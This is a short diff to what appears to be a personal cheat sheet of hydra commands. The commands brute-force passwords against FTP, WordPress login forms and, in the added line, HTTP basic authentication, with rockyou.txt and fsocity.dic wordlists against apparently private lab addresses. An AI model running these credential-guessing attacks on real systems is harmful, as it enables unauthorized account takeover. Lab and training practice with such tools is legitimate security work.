@@ -4,6 +4,8 @@ hydra -l user -P passlist.txt ftp://192.168.0.1
 hydra -L file+name -p test target http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username" -t 30
 #Crak password for username
 hydra -l username -P fsocity.dic 10.10.28.2 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -t 30
+#Simple authentication
+hydra -l username -P /usr/share/wordlists/rockyou.txt -f 10.10.238.243 http-get /protected
 
 #Cracking passphrase for private key
 
